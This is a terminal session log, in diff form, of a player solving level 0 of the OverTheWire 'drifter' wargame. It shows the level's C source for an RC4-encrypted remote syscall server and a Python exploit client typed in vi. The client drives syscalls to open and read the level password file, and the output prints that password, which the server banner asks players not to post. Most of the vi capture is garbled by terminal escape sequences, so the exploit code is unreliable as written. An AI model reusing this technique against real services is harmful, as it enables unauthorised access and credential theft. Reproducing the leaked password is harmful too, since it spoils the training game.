@@ -1,0 +1,454 @@
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 drifter0@drifter.labs.overthewire.org -p 2230
+                             _      _  __ _            
+                          __| |_ __(_)/ _| |_ ___ _ __ 
+                         / _` | '__| | |_| __/ _ \ '__|
+                        | (_| | |  | |  _| ||  __/ |   
+                         \__,_|_|  |_|_|  \__\___|_|   
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+drifter0@drifter.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+drifter0@drifter:~$ id
+uid=19000(drifter0) gid=19000(drifter0) groups=19000(drifter0)
+drifter0@drifter:~$ ls -la /drifter/drifter0_src/
+total 20
+drwxr-xr-x 2 root     root     4096 Oct 25 13:38 .
+drwxr-xr-x 7 root     root     4096 Oct 25 13:38 ..
+-rw-r--r-- 1 drifter0 drifter0 3827 Oct 25 13:38 drifter0.c
+-rw-r--r-- 1 drifter0 drifter0 1129 Oct 25 13:38 rc4.c
+-rw-r--r-- 1 drifter0 drifter0  344 Oct 25 13:38 rc4.h
+drifter0@drifter:~$ cat /drifter/drifter0_src/drifter0.c
+/*
+ * Level 0 for drifter - Jan 16th, 2008
+ *
+ * This is an extremely simple / stupid remote procedure call implementation
+ * that allows system calls and parameters to be supplied directly, and 
+ * return codes written to the caller. 
+ *
+ * For security reasons, it is chrooted and drops privileges, and in addition,
+ * the connection is encrypted. (The previous sentence is a joke..)
+ *
+ * In the chroot directory, there is a file called 'instructions', open that, 
+ * read the contents, and you'll know what to do next.
+ *
+ * In order to make things easier for yourself, there is plenty of tools 
+ * out there already - I suggest that you read up and learn about them.
+ *
+ * - a scripting language (I humbly suggest Python, but whatever you're most
+ *   comfortable with)
+ * - http://oss.coresecurity.com/projects/inlineegg.html
+ * - mosdef - http://www.immunitysec.com/resources-freesoftware.shtml
+ * - http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0006.html
+ * - metasploit.com
+ * - Plenty of other things :)
+ *
+ * To compile this code, gcc level0.c rc4.c -o /drifter/level0
+ */
+
+#include <stdlib.h>
+#define _GNU_SOURCE
+#define __USE_GNU
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/socket.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <signal.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <grp.h>
+
+#include "rc4.h"
+
+
+void dropprivs()
+{
+	int groups[1];
+
+	#ifndef LEVELUID
+	#error LEVELUID is not defined
+	#endif
+	
+	#define LEVEL0 LEVELUID
+	groups[0] = LEVEL0;
+	if(setgroups(1, groups) != 0) exit(15);
+	if(setresgid(LEVEL0, LEVEL0, LEVEL0) != 0) exit(4);
+	if(setresuid(LEVEL0, LEVEL0, LEVEL0) != 0) exit(5);
+	#undef LEVEL0
+}
+
+void setup_stuff()
+{
+	/* Become a daemon, and drop privileges, chroot off, etc. */
+
+	signal(SIGCHLD, SIG_IGN); // ignore children.. seems to work :p
+
+	//if(daemon(0, 0) != 0) exit(1);
+
+	if(chroot("/home/drifter0/chroot") != 0) exit(2);
+	if(chdir("/") != 0) exit(3);
+	dropprivs();
+}
+
+int create_socket()
+{
+	/* Create / bind / listen on socket */
+
+	int ret;
+	struct sockaddr_in sin;
+
+	ret = socket(AF_INET, SOCK_STREAM, 0);
+	if(ret == -1) exit(6);
+
+	memset(&sin, 0, sizeof(struct sockaddr_in));
+	sin.sin_family = AF_INET,
+	sin.sin_addr.s_addr = htonl(INADDR_ANY);
+	sin.sin_port = htons(1111);
+
+	if(bind(ret, (void *)&sin, sizeof(struct sockaddr_in)) == -1) exit(7);
+
+	if(listen(ret, 5) == -1) exit(8);
+
+	return ret;
+
+}
+
+void handle_client(int skt, struct sockaddr_in *sin)
+{
+	// Handle the client connection, and perform the requested operations.
+	
+	rc4_key key_in, key_out;
+	unsigned char keymat[6];
+	unsigned int args[9];
+	int i, ret;
+
+	//dropprivs();
+
+	memcpy(keymat, &(sin->sin_addr.s_addr), 4);
+	memcpy(keymat+4, &(sin->sin_port), 2);
+
+	prepare_key(keymat, 6, &key_in);
+	prepare_key(keymat, 6, &key_out);
+
+	for(i=0;i<42;i++) {
+		// cycle through first 256 bytes
+		rc4((unsigned char *)keymat, 6, &key_in);
+		rc4((unsigned char *)keymat, 6, &key_out);
+	}
+
+	while(1) {
+		alarm(60);
+		sleep(1);
+
+		if(read(skt, &args, sizeof(args)) != sizeof(args)) exit(EXIT_SUCCESS);
+
+		rc4((unsigned char *)&args, sizeof(args), &key_in);
+		
+		ret = syscall(args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8]);
+
+		rc4((unsigned char *)&ret, sizeof(int), &key_out);
+
+		if(write(skt, &ret, sizeof(ret)) != sizeof(ret)) exit(EXIT_SUCCESS);
+
+	}
+
+}
+
+void mainloop()
+{
+	int skt;
+	int cli;
+	int so;
+	int ret;
+
+	struct sockaddr_in sin;
+
+	skt = create_socket();
+
+	while(1) {
+		so = sizeof(struct sockaddr_in);
+		cli = accept(skt, (void *)&sin, &so);
+		if(cli == -1) exit(9);
+
+		ret = fork();
+		if(ret == -1) exit(10);
+		
+		// parent
+		
+		if(ret) {
+			close(cli);
+			continue;
+		}
+
+		// child
+		close(skt);
+		handle_client(cli, &sin);
+		exit(EXIT_SUCCESS);
+	}
+}
+
+int main(int argc, char **argv)
+{
+	setup_stuff();
+
+	mainloop();	
+}
+drifter0@drifter:~$ cat /drifter/drifter0_src/rc4.c
+
+#include "rc4.h"
+
+void prepare_key(unsigned char *key_data_ptr, int key_data_len, rc4_key *key)
+{
+  int i;
+  unsigned char t;
+  unsigned char swapByte;
+  unsigned char index1;
+  unsigned char index2;
+  unsigned char* state;
+  short counter;
+
+  state = &key->state[0];
+  for(counter = 0; counter < 256; counter++)
+  state[counter] = counter;
+  key->x = 0;
+  key->y = 0;
+  index1 = 0;
+  index2 = 0;
+  for(counter = 0; counter < 256; counter++)
+  {
+    index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
+    swap_byte(&state[counter], &state[index2]);
+    index1 = (index1 + 1) % key_data_len;
+  }
+}
+
+void rc4(unsigned char *buffer_ptr, int buffer_len, rc4_key *key)
+{
+  unsigned char t;
+  unsigned char x;
+  unsigned char y;
+  unsigned char* state;
+  unsigned char xorIndex;
+  short counter;
+
+  x = key->x;
+  y = key->y;
+  state = &key->state[0];
+  for(counter = 0; counter < buffer_len; counter++)
+  {
+    x = (x + 1) % 256;
+    y = (state[x] + y) % 256;
+    swap_byte(&state[x], &state[y]);
+    xorIndex = (state[x] + state[y]) % 256;
+    buffer_ptr[counter] ^= state[xorIndex];
+  }
+  key->x = x;
+  key->y = y;
+}
+
+drifter0@drifter:~$ mkdir -p /run/screen/d0 && cd /run/screen/d0
+drifter0@drifter:/run/screen/d0$ vi /run/screen/d0/drifter0_client.py
+[>4;2m="/run/screen/d0/drifter0_client.py" 77L, 2617B▽  Pzz\[0%m           [>cimport socket, struct, sys, time
+HOST = "127.0.0.1"PORT = 1111def rc4(state, x, y, data):
+    buf = bytearray(data)
+    for i in range(len(buf)):x = (x + 1) % 256y = (state[x] + y) % 256state[x], state[y] = state[y], state[x]buf[i] ^= state[(state[x] + state[y]) % 256]
+    return state, x, y, bytes(buf)
+def prepare_key(keymat):
+    s = list(range(256)); j = 0
+    for i in range(256):j = (keymat[i % len(keymat)] + s[i] + j) % 256s[i], s[j] = s[j], s[i]
+    return s, 0, 0
+def call(sock, K, nr, *a):
+    a = a + (0,) * (8 - len(a))
+    sti, xi, yi, sto, xo, yo = K
+    sti, xi, yi, enc = rc4(sti, xi, yi, struct.pack("<9I", nr, *a))
+    sock.sendall(enc)
+    r = b""
+    while len(r) < 4:c = sock.recv(4 - len(r))if not c: raise EOFErrorr += c
+    sto, xo, yo, dec = rc4(sto, xo, yo, r)
+    return (sti, xi, yi, sto, xo, yo), struct.unpack("<i", dec)[0]
+s = socket.create_connection((HOST, PORT), timeout=10)
+me = s.getsockname()# what the SERVER sees as the peer
+keymat = socket.inet_aton(me[0]) + struct.pack(">H", me[1])
+print("keymat:", keymat.hex())1,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1Alli1,2m3p4o5r6import78s9o10c1k2e3t4,56s7t8str9stru20c1t2,34s5y6s7,89t30i1m2e32,1 H2O3S4T56=78"91102172.304.506.718"93,1 P2O3R4T56= 191111124,1 d2e3def45r6c748(9s10t1a2t3e4,56x7,89y20,12d3a4t5a6)()7:()85,1 2345b6u7f89=101byte5ar7r8a9bytearray20(da3t4a5)(data)6(data)6,1 2345f6o7for i101i2in34r5a6n7g8range9(20l1e2len3(4b5u6f7)(buf)8)((buf))9:()307,1 23456789x101=2 (x56+7819)21%232455668,1 456789y101=23(4s5t6a7t8e9[20x1][x]2[x]3+45y6)()7()8%9302152639,1 23456789s10t1a2t3e4[5x6][x]7,[x]9s20t1a2t3e4[5y6][y]7[y]8=930s1t2a3t4e5[6y7][y]8,[y]940s1t2a3t4e5[6x7][x]8[x]10,123456789b10u1f2[3i4][i]5[i]6^7=89s20t1a2t3e4[5(6s7t8a9t30e1[2x3][x]4[x]5+67s8t9a40t1e2[3y4][y]5)([y])6()7%892505162][]3[]1,1 2345r6e7t8u9r10return12s3t4a5t6e7,89x20,12y3,45b6y7t8e9bytes30(1b2u3f4)(buf)5(buf)2,1 d2e3def45p6r7e8p9a10r1e2_3k4e5y6(7k8e9y20m1a2t3)(keymat)4:(keymat)53,1 2345s67=89l10i1s2list3(4r5a6n7g8range9(20215263)()4)(())5;()67j89=301024,1 2345f6o7for89i101i2in34r5a6n7g8range9(2025263):55,1 23456789j101=23(4k5e6y7m8a9t20[1i23%45l6e7len8(9k30e1y2m3a4t5)(keymat)6][(keymat)]7[]8+940s1[2i3][i]4[i]5+67j8)()9()50%122354656,1 23456789s10[1i2][i]3,[i]45s6[j8][j]9[j]20=12s3[4j5][j]6,[j]78s9[30i1][i]2[i]7,1 2345r6e7t8u9r10return12s3,4506,78098,1 d2e3def45c6a7l8l9(10s1o2c3k4,56K7,9n20r1,23*a):79,1 2345a67=89a101+23(405,6)()7()8*920(1823-45l6e7len8(9a30)(a)1)((a))2()20,1 345s6t7i8,910x1i2,34y5i6,78s9t20o1,23x4o5,67y8o930=12K31,1 2345s6t7i8,910x1i2,34y5i6,78e9n20c12=34r5c647(8s9t30i,3x4i5,67y8i9,401s2t3str4stru5c6t7.8p9a50c1k2(3"4<596I7"8,960n1r2,34*5a6)()7)(())8()2,1 2345s6o7c8k.10s1e2n3d4a5l6l7(8e9n20c1)(enc)2(enc)3,1 2345r67=89b10b"1"24,1 2345w6h7i8l9while10 l2e3len4(5r6)(r)7(r)8<92041:25,1 23456789c11=23s4o5c6k7.8r9e20c1v2(3445-67l8e9len30(1r2)(r)3)((r))4()6,1 2456789i10if12n3o4not56c7:89r20a1i2raise45E6O7F8E9r30r1o2EOFError37,1 23456789r101+=34c58,1 2345s6t7o8,910x1o2,34y5o6,78d9e20c12=4r5c647(8s9t30o1,23x4o5,67y8o9,401r2)()3
+~                                                                                                   29,1Bot()
+2345r6e7t8u9r10return12(3s4t5i6,78x9i20,12y3i4,56s7t8o9,301x2o3,45y6o7)()8,()940s1t2str3stru4ct.un9p50a1c2k3(4"5<6i7"8,960d1e2c3)()4[()506][]7
+~                                                                                                   30,1Bot[]
+s23=45s6o7c8k9e10t1.2c3r4e5a6t7e8_9c20o1n2n3e4c5t6i7o8n9(30(1H2O3S4T5,67P8O9R40T1)()2,()34t5i6m7e8o9u50t1=21304)()5
+~                                                                                                   31,1Bot()
+m2e34=56s7.8g9e10t1s2o3c4k5n6a7m8e9(20)()1()23456789301#2 3w4h5a6t7 8t9h40e1 2S3E4R5V6E7R8 9s50e1e2s3 4a5s6 7t8h9e p62e3e4r5
+~                                                                                                   32,1Botk2e3y4m5a6t78=910s1o2c3k4e5t6.7i8in9ine20t1_2a3t4o5n6(7m8e9[3001][]2)(me[])3()4+56s7t8str9stru40c1t2.3p4a5c6k7(8"9>50H1"2,34m5e6[718][]9)([])60
+~                                                                                                   33,1Bot()
+p2r3i4n5print6(7"8k9e10y1m2a3t4:5"6,78k9e20y1m2a3t4.5h6e7x8(9)()30)(())1
+~                                                                                                   34,1Bot()
+s2t3i4,56x7i8,910y1i23=45p6r7e8p9a20r1e2_3k4e5y6(7k8e9y30m1a2t3)(keymat)4
+~                                                                                                   35,1Bot(keymat)
+s2t3o4,56x7o8,910y1o23=45p6r7e8p9a20r1e2_3k4e5y6(7k8e9y30m1a2t3)(keymat)4
+~                                                                                                   36,1Bot(keymat)
+f2o3for45_67i8in910r1a2n3g4range5(64728)()9:()2012345678930#1 2s3k4i5p6 74829*4061 2k3e4y5s6t7r8e9a50m1 2b3y4t5e6s7 8b9o60t1h2 3w4a5y6s7
+~                                                                                                   37,1Bot2345s6t7i8,910x1i2,34y5i6,78_920=12r3c445(6s7t8i9,301x2i3,45y6i,89b40b"1\203"45*6768)()9
+~                                                                                                   38,1Bot()
+2345s6t7o8,910x1o2,34y5o6,78_920=12r3c445(6s7t8o9,301x2o3,45y6o7,89b40b"1\203"45*6768)()9
+~                                                                                                   39,1Bot()
+K23=45(6s7t8i9,101x2i3,45y6i7,89s20t1o2,34x5o6,78y9o30)K = ()1
+~                                                                                                   40,1Bot()
+K2,34u5i6d78=910c1a2l3l4(5s6,78K9,2012243)()4;()56p7r8i9n30print1(2"3g4e5t6u7i8d9 40-1>2"3,45u6i7d8)()9
+~                                                                                                   41,1Bot()
+K2,34p5a6g7e89=101c2a3l4l5(6s7,89K20,12139425,67080x90x13001020304050607,890400x10x12030405,673, 051x22, 0x8
+0xffffffff, 0)~                                                                                                   42,1Botpr3print("m9map2 14->", he21hex2(3p4a5g6e78&930010x20xffffff8ff)()41);()34page &50= 0xf5f6ffffff62
+~                                                                                                   43,1Botpath5fd = N11
+None~                                                                                                   44,1Botf2o3for45f6d78i9in101(3,4 4, 5,2162
+):~                                                                                                   45,1Bot5K,78r910=12c3a4l5l6(7s8,9 K, 12408,8fd30, pa4g5e +8 0x410x400,6
+0)~                                                                                                   46,1Bot2345i6if r == 0:15
+~                                                                                                   47,1Bot3456789p10a1thfd =7 fd;212
+break~                                                                                                   48,1Botprint(7"so10c1k2e3t4 5f6d7:8"9,201p2
+athfd)~                                                                                                   49,1Botsti, xi,910yi,4s5t6o7,89x20o1,23y4o5 =8
+K~                                                                                                   50,1Botst3i,56xi, yi12, enc7 = rc423(4s5t6i7,89x30i1,2 yi5
+,~                                                                                                   51,1Bot245s6truc10t.pac5k(7"8<9920I1"2,3435,67p8a9thfd,34 page,40 19,450, 0,50 0, 05, 0))()60
+~                                                                                                   52,1Bot()
+s.3senda8ll(e12nc4); s.9sen22da4l5l(b"/30dr2ift5er0.p40a1s2s3w4o5r6d7\809"50)()1
+~                                                                                                   53,1Bot()
+r =5b""8
+~                                                                                                   54,1Botw2h3i4l5while67l8e9len10(1r2)(r)3(r)4<5647:8
+~                                                                                                   55,1Bot2345r67+8=910s1.2r3e4c5v6(7489-201l2e3len(r)(r)7)((r))8
+~                                                                                                   56,1Bot()
+s2t3o4,56x7o8,910y1o2,34d5e6c78=920r1c243(4st6o7,89x30o1,23y4o5,67r8)()9
+~                                                                                                   57,1Bot()
+K23=45(6s7t8i9,101x2i3,45y6i7,89s20t1o2,34x5o6,78y9o30)K = ()1
+~                                                                                                   58,1Bot()
+p2r3i4n5print6(7"8r9e10a1d2 3p4a5t6h7 8-9>20"1,23s4t5str6stru7c8t9.30u1n2p3a4c5k6(7"8<9i40"1,23d4e5c6)()7[()809][]50)([])1
+~                                                                                                   59,1Bot()
+K2,34f5d6r78=910c1a2l3l4(s6,78K9,20152,34p5a6g7e8,93001,2304)()5
+~                                                                                                   60,1Bot()
+p2r3i4n5print6(7"8o9p10e1n2 3-4>5"6,78fdr21)()2
+~                                                                                                   61,1Bot()
+K2,34n56=78call(13s, K, 320,12f3d4r5,67p8a9g30e12+34050x60x2700, 64243)()4
+~                                                                                                   62,1Bot()
+pr3i4n5print6(7"8r9e10a1d2 3f4i5l6e7 8-9>20"1,2 n)()5
+~                                                                                                   63,1Bot()
+s2t3i4,56xi,10yi, st6o7,89x20o1,23yo56=78K9
+~                                                                                                   64,1Bots2t3i4,5 xi,910y1i2,34enc = r21c4(s5t6i7,89x30i1,23y4i5,6
+~                                                                                                   65,1Bot2345s6t7str8stru9c10t1.pack6("<9I21"2,3445,67p8at30h1f2d3,45p6a7g8e9 + 0430x40x250607,89n, 0,54506,7809,60 0, 05)()6)(())7
+~                                                                                                   66,1Bot()
+s.senda8ll(11enc4)(enc)5
+~                                                                                                   67,1Bot(enc)
+da3ta6=78b9b"10"1
+~                                                                                                   68,1Bots.set6t7i8m9e10o1u2t3(455
+)~                                                                                                   69,1Botw2h3i4l5while67l8len10(dat4a5)(data)6 < n(data)201+2 4:5
+~                                                                                                   70,1Bot    c6 = s.re13cv5(6648
+)~                                                                                                   71,1Bot2345i6if78n9o10not12c3:45b6r7break20
+~                                                                                                   72,1Bot2345data +=123c4
+~                                                                                                   73,1Botp2print(7"8E9X10F1I2L raw7:8",21data[:n][:n]9)([:n])30
+~                                                                                                   74,1Bot()
+s2t3o4,56x7o8,910y1o2,34d5e6c78=920r1c243(4s5t6o7,89x30o1,23y4o5,67d8a9t40a1[2n3:4n5+647][]8)([])9
+~                                                                                                   75,1Bot()
+p2r3i4n5print6(7"8w9r10i1t2e3 4-5>6"7,89s20t1str2stru3c4t5.6u7n8p9a30c1k2(3"4<5i6"7,89d40e1c2)()3[()405][]6)([])7
+~                                                                                                   76,1Bot()
+s2.3c4l5o6s7e8(9)()10
+~                                                                                                   77,1Bot()
+^[  77,0-1Bot:wq[>4;m"drifter0_client.py" 77L, 2617B written
+>[>4;mdrifter0@drifter:/run/screen/d0$ python3 /run/screen/d0/drifter0_client.py
+keymat: 7f000001a66a
+getuid -> 19000
+mmap2 -> 0x10000000
+socket fd: 4
+read path -> 19
+open -> 3
+read file -> 33
+EXFIL raw: b'yttCfzKiorcOz5V0Nr9AVk6SZ13IonYV\n'
+write -> 33
+drifter0@drifter:/run/screen/d0$ - 
+-: command not found
+drifter0@drifter:/run/screen/d0$ cat /home/drifter0/chroot/drifter0.password
+yttCfzKiorcOz5V0Nr9AVk6SZ13IonYV
+drifter0@drifter:/run/screen/d0$ exit
+logout
+Connection to drifter.labs.overthewire.org closed.
+client$ exit
+exit
